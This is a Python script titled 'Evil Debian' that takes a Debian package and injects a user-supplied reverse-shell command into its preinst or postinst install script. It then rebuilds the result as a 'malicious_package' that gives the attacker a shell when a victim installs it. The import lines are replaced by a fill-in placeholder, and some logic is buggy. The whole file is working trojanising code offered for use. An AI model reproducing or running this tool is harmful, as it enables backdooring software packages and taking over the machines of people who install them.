#!/usr/bin/python3
<FILL_HERE>

print('''
                                 ███████╗██╗░░░██╗██╗██╗░░░░░  ██████╗░███████╗██████╗░██╗░█████╗░███╗░░██╗
                                 ██╔════╝██║░░░██║██║██║░░░░░  ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗████╗░██║
                                 █████╗░░╚██╗░██╔╝██║██║░░░░░  ██║░░██║█████╗░░██████╦╝██║███████║██╔██╗██║
                                 ██╔══╝░░░╚████╔╝░██║██║░░░░░  ██║░░██║██╔══╝░░██╔══██╗██║██╔══██║██║╚████║
                                 ███████╗░░╚██╔╝░░██║███████╗  ██████╔╝███████╗██████╦╝██║██║░░██║██║░╚███║
                                 ╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ╚═════╝░╚══════╝╚═════╝░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝                           Written by~: Asad''')
print("                                                                                                                    For any Help Dm me on Discord~: Asad#2809 ")
deb_file_name = input("Enter the debian file full Location : ")

file_name = deb_file_name[:-1][:-2][:-1]
try:
    subprocess.run(f"dpkg-deb -R {deb_file_name} {file_name}", shell=True, check=True)
except subprocess.CalledProcessError:
    print("Not a debian file or file does not exist")
try:

    subprocess.run(f"cd {file_name}/DEBIAN", shell=True, check=True)
except():
    print("Directory does not exist")
file_exist = os.path.exists(f"{file_name}/DEBIAN/preinst")
file_exist2 = os.path.exists(f"{file_name}/DEBIAN/postinst")
reverse_shell = input("Enter your reverse shell >  ")
if file_exist:
    subprocess.run(f"echo {reverse_shell} >> {file_name}/DEBIAN/preinst", shell=True, check=True)
    subprocess.run(f"chmod +x {file_name}/DEBIAN/preinst", shell=True, check=True)
elif file_exist2:
    subprocess.run(f"echo {reverse_shell} >> {file_name}/DEBIAN/postinst", shell=True, check=True)
    subprocess.run(f"chmod +x {file_name}/DEBIAN/postinst", shell=True, check=True)
else:
    subprocess.run(f"echo {reverse_shell} >> {file_name}/DEBIAN/preinst", shell=True, check=True)
    subprocess.run(f"chmod +x {file_name}/DEBIAN/preinst", shell=True, check=True)

os.chdir(f'{file_name}/..')
pwd = os.getcwd()
try:
    subprocess.run(f"mkdir {pwd}/malicious_package", shell=True, check=True)
except FileExistsError:
    pass
os.chdir(f"{pwd}/malicious_package")
subprocess.run(f"cp -r ../../../../../../../{file_name} {pwd}/malicious_package", shell=True, check=True)
os.chdir(f"{pwd}/malicious_package")
subpro = subprocess.Popen("ls", shell=True, stdout=subprocess.PIPE)
subprocess_return = subpro.stdout.read()
name=subprocess_return.decode('ascii')
try:
    subprocess.run(f"dpkg-deb --build {name}", shell=True, check=True)
except FileExistsError:
    print("File already exist , first remove the existing file and then try rerunning the program ")